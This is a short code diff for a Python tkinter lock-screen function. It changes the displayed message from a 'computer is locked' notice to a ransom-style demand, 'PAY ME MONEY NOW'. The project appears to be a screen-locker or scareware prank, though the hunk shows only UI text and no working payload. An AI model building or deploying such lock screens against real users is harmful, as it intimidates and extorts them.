@@ -71,7 +71,7 @@ def show_locked_screen():
     # Locked message
     message = tk.Label(
         root,
-        text="YOUR COMPUTER IS LOCKED\nEnter the password to unlock.",
+        text="PAY ME MONEY NOW ,LOL I GOT YOU .",
         fg="white",
         bg="black",
         font=("Poppins", 50)
